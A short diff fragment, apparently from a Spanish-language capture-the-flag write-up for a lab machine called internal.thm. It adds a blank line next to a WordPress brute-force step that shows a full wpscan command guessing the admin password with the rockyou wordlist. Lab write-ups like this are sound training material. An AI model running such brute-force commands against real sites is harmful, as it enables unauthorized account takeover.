@@ -67,6 +67,7 @@
  |  - http://internal.thm/blog/wp-content/themes/twentyseventeen/style.css?ver=20190507, Match: 'Version: 2.3'
   ````
 5. **Fuerza bruta en Wordpress**
+
         - wpscan --url http://internal.thm/blog/wp-login.php --passwords /usr/share/wordlists/rockyou.txt --usernames admin --max-threads 50
  ````
  [!] Valid Combinations Found:
